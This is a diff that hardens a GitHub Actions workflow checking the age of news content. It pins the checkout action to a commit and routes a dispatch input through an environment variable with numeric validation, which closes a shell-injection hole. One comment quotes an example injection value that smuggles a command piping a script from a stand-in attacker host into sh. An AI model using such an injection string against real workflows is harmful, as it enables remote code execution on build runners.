@@ -24,11 +24,19 @@ jobs:
   check:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
 
       - id: age
+        # The dispatch input goes through env, not into the run: body. A ${{ }}
+        # expression is pasted in as text before the shell sees it, so an input
+        # of `3"; curl evil.tld | sh; #` would execute here.
+        env:
+          MAX_AGE_DAYS: ${{ github.event.inputs.max_age_days || '3' }}
         run: |
-          MAX="${{ github.event.inputs.max_age_days || '3' }}"
+          MAX="$MAX_AGE_DAYS"
+          # `[ "$age" -gt "$MAX" ]` below errors out on anything non-numeric.
+          case "$MAX" in ''|*[!0-9]*) MAX=3 ;; esac
+
           newest=$(ls -1 content/news/*.md 2>/dev/null \
                    | grep -v '_index.md' \
                    | sed -n 's|.*/\([0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}\)-.*|\1|p' \
